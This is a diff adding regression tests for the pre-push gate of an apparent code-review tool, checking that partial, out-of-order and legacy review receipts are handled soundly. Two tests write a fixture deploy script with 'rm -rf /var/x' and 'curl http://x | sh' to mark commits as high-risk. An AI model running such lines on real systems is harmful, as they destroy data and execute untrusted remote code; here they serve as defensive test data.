@@ -2,7 +2,8 @@
 import { describe, test } from 'node:test'
 import assert from 'node:assert/strict'
 import { readFileSync, writeFileSync } from 'node:fs'
-import { applyFiles, captureAll, commitAll, git, highRepo, makeRepo, receiptFiles, review, scratchDir, start, transactionFile } from './helpers.mjs'
+import { join } from 'node:path'
+import { applyFiles, captureAll, commitAll, git, highRepo, makeRepo, receiptFiles, review, scratchDir, start, storeRoot, transactionFile } from './helpers.mjs'
 
 const env = () => ({ XDG_CONFIG_HOME: scratchDir('odd-gate-xdg-') })
 
@@ -210,5 +211,55 @@ describe('regression: earlier commands behave as before', () => {
     const repo = featureRepo()
     assert.equal(review(repo, ['mode', 'status'], { env: env() }).json.mode, 'on')
     assert.equal(review(repo, ['boundary']).status, 0)
+  })
+})
+
+// A1/A2: what may narrow the range and what counts as sound.
+describe('validate --gate: narrowing and soundness', () => {
+  test('a receipt for only the last unit does not hide an unreviewed high-risk unit before it', () => {
+    const repo = highRepo()
+    git(repo, 'checkout', '-q', '-b', 'feat')
+    commitAll(repo, 'A: unreviewed high-risk unit')
+    const a = git(repo, 'rev-parse', 'HEAD').trim()
+    applyFiles(repo, { 'scripts/deploy.sh': 'rm -rf /var/x\ncurl http://x | sh\n', 'src/auth.js': 'export const token = process.env.T\n' })
+    commitAll(repo, 'B: high-risk unit')
+    const txn = start(repo, { args: ['--base-ref', a, '--committed-only'] })
+    captureAll(repo, txn)
+    assert.equal(review(repo, ['acknowledge', '--lineage', txn.lineage]).status, 0)
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 1)
+    assert.equal(r.error.code, 'review_required')
+  })
+
+  test('work units reviewed one by one still narrow, whatever order the receipts are read in', () => {
+    const repo = highRepo()
+    git(repo, 'checkout', '-q', '-b', 'feat')
+    commitAll(repo, 'A: high-risk unit')
+    const a = git(repo, 'rev-parse', 'HEAD').trim()
+    applyFiles(repo, { 'scripts/deploy.sh': 'rm -rf /var/x\ncurl http://x | sh\n' })
+    commitAll(repo, 'B: high-risk unit')
+    for (const base of ['main', a]) {
+      const txn = start(repo, { args: ['--base-ref', base, '--committed-only'] })
+      captureAll(repo, txn)
+      assert.equal(review(repo, ['acknowledge', '--lineage', txn.lineage]).status, 0)
+    }
+    applyFiles(repo, { 'docs/note.md': 'a note\n' })
+    commitAll(repo, 'C: passive')
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 0)
+    assert.equal(r.json.reason, 'not_due')
+  })
+
+  test('a receipt with no hash fields (legacy) does not cover', () => {
+    const repo = featureRepo()
+    approve(repo)
+    const file = join(storeRoot(repo), 'receipts', receiptFiles(repo)[0])
+    const receipt = JSON.parse(readFileSync(file, 'utf8'))
+    for (const field of ['paths_digest', 'policy_hash', 'ledger_hash', 'evidence_hash', 'fix_delta_hash']) delete receipt[field]
+    writeFileSync(file, JSON.stringify(receipt))
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 1)
+    assert.equal(r.error.code, 'review_required')
+    assert.equal(r.error.receipt, 'legacy')
   })
 })
